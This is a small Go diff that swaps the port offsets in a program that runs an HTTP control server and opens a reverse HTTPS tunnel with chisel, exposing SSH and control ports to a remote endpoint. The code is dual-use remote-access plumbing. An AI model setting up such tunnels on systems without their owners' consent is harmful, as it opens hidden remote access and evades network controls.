@@ -52,7 +52,7 @@ func main() {
 
 // ControlServer Acts as a Simple Mechanism for Translating HTTP requests into GoLang Commands
 func ControlServer(BasePort int) {
-	controlPort := strconv.Itoa(BasePort + 1)
+	controlPort := strconv.Itoa(BasePort + 0)
 
 	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		fmt.Fprintf(w, "OK\n")
@@ -111,12 +111,12 @@ func ControlServer(BasePort int) {
 
 // ChiselWorker Creates a Reverse HTTPS Tunnel
 func ChiselWorker(BasePort int) (err error) {
-	sshPort := strconv.Itoa(BasePort + 0)
-	controlPort := strconv.Itoa(BasePort + 1)
+	controlPort := strconv.Itoa(BasePort + 0)
+	sshPort := strconv.Itoa(BasePort + 1)
 
 	config := chisel.Config{Headers: http.Header{}}
 	config.Server = endpoint_url
-	config.Remotes = []string{"R:" + sshPort, "R:" + controlPort}
+	config.Remotes = []string{"R:" + controlPort, "R:" + sshPort}
 
 	c, err := chisel.NewClient(&config)
 	if err != nil {
